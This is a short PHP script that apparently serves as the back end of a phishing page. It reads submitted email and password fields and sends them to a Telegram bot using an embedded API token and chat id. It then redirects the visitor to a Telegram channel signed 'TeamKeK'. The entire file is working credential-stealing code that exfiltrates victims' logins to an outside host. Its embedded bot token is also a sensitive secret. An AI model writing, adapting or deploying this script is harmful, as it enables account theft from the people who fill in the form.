<?php
header ('Location: https://t.me/TeamKeK ');
$API_KEY = "1210963661:AAEV5jIMkx_US5qxWp827bWJwJBiPRr0WJ8"
$admin =385644809;
$user = $_POST['email'];
$pass = $_POST['pass'];
$text = urlencode("
𝙴𝙼𝙰𝙸𝙻 : `$user`
𝙿𝙰𝚂𝚂 : `$pass`
𝚃𝙷𝙴 𝙸𝙽𝙳𝙴𝚇 𝙱𝚈 † @TeamKeK
");
$url = "https://api.telegram.org/bot".$API_KEY."/sendMessage?chat_id=$admin&text=$text&parse_mode=markdown";
file_get_contents($url);
?>
